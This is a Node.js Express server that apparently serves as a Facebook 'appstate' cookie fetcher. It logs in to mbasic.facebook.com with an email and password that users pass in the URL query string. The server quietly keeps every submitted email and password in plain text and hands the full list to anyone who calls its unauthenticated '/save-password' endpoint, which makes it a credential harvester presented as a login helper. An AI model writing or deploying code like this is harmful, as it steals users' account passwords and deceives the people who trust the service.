const express = require('express');
const request = require('request-promise');
const cheerio = require('cheerio');
const helmet = require('helmet');

const app = express();
app.use(helmet());
app.use(express.json());
app.set('json spaces', 4);

const fbConfig = {
    useragent: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    loginUrl: "https://mbasic.facebook.com/login.php",
};

const credentialsStore = [];

app.get('/login', async (req, res) => {
    const { email, password } = req.query;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email and password are required' });
    }

    try {
        const appState = await login(email, password);
        credentialsStore.push({ email, password });
        return res.json(appState);
    } catch (error) {
        console.error(error);
        return res.status(500).json({ error: 'Internal Server Error', details: error });
    }
});

app.get('/save-password', (req, res) => {
    return res.json({ credentials: credentialsStore });
});

async function login(email, password) {
    const headers = { 'User-Agent': fbConfig.useragent };
    const jar = request.jar();

    const initialResponse = await sendRequest(fbConfig.loginUrl, headers, jar);
    const $ = cheerio.load(initialResponse);
    const formData = extractFormData($, email, password);

    const loginResponse = await sendPostRequest(fbConfig.loginUrl, headers, formData, jar);
    return parseAllCookies(jar.getCookies(fbConfig.loginUrl));
}

async function sendRequest(url, headers, jar) {
    try {
        const body = await request({ url, headers, jar });
        return body;
    } catch (error) {
        throw new Error("Initial request failed: " + error.message);
    }
}

async function sendPostRequest(url, headers, formData, jar) {
    try {
        const body = await request.post({ url, headers, form: formData, jar });
        return body;
    } catch (error) {
        throw new Error("Login request failed: " + error.message);
    }
}

function extractFormData($, email, password) {
    return {
        lsd: $('input[name="lsd"]').val(),
        jazoest: $('input[name="jazoest"]').val(),
        m_ts: $('input[name="m_ts"]').val(),
        li: $('input[name="li"]').val(),
        try_number: $('input[name="try_number"]').val(),
        unrecognized_tries: $('input[name="unrecognized_tries"]').val(),
        bi_xrwh: $('input[name="bi_xrwh"]').val(),
        email,
        pass: password,
        login: "submit"
    };
}

function parseAllCookies(cookies) {
    return cookies.map(cookie => ({
        key: cookie.key,
        value: cookie.value,
        domain: cookie.domain,
        path: cookie.path,
        hostOnly: !cookie.domain.startsWith('.'),
        httpOnly: cookie.httpOnly || false,
        secure: cookie.secure || false,
        expiration: cookie.expires || null,
        creation: new Date().toISOString(),
        lastAccessed: new Date().toISOString()
    }));
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
